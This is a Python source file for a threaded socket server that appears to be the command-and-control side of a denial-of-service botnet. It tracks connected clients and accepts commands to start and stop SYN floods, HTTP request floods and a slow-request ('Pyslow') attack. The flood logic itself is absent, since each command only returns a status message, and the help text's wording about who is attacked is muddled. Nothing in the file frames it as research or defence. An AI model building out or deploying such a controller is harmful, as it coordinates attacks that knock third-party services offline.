import socket
import threading

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 65432
BUFFER_SIZE = 1024

# Help message with available commands
HELP_MESSAGE = """
Available Commands:
/start_syn      - Initiates a SYN flood attack on the client.
/start_http     - Initiates an HTTP request flood attack on the client.
/start_pyslow   - Initiates a Pyslow attack on the client.
/stop           - Stops all ongoing attacks on the client.
/list           - Lists all clients and their connection status.
/help           - Displays this help message with command details.
"""

# Dictionary to keep track of client statuses
clients = {}

def handle_client(client_socket, client_address):
    # Register the client as connected in the clients dictionary
    clients[client_address] = 'Connected'
    print(f"[INFO] Connection from {client_address} has been established.")
    
    # Send initial welcome and help message to the client
    client_socket.sendall("Connected to server. Type /help for available commands.\n".encode())
    
    while True:
        try:
            # Receive the command from the client
            command = client_socket.recv(BUFFER_SIZE).decode().strip()
            if not command:
                break  # Client disconnected

            print(f"[INFO] Command received from {client_address}: {command}")

            # Process the received command
            if command == "/help":
                client_socket.sendall(HELP_MESSAGE.encode())
            elif command == "/start_syn":
                client_socket.sendall("Starting SYN flood attack...\n".encode())
            elif command == "/start_http":
                client_socket.sendall("Starting HTTP request flood attack...\n".encode())
            elif command == "/start_pyslow":
                client_socket.sendall("Starting Pyslow attack...\n".encode())
            elif command == "/stop":
                client_socket.sendall("Stopping all attacks...\n".encode())
            elif command == "/list":
                # Display list of connected and disconnected clients
                client_list = "\n".join([f"{addr}: {status}" for addr, status in clients.items()])
                client_socket.sendall(f"Client List:\n{client_list}\n".encode())
            else:
                # Send error message if command is unknown
                client_socket.sendall(f"Unknown command: {command}\nType /help for available commands.\n".encode())

            # Receive ACK from the client after executing each command
            ack = client_socket.recv(BUFFER_SIZE).decode().strip()
            if ack == "ACK":
                print(f"[INFO] Acknowledgment received from {client_address}")

        except (ConnectionResetError, BrokenPipeError):
            print(f"[ERROR] Connection lost with {client_address}")
            break
    
    # Update client status to disconnected and close the client socket
    clients[client_address] = 'Disconnected'
    client_socket.close()
    print(f"[INFO] Connection with {client_address} closed.")

def start_server():
    # Initialize and configure the server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    print(f"[INFO] Server listening on {SERVER_HOST}:{SERVER_PORT}")

    while True:
        # Accept a new client connection
        client_socket, client_address = server_socket.accept()
        
        # Handle the new client in a separate thread
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

if __name__ == "__main__":
    print("[INFO] Starting server...")
    start_server()
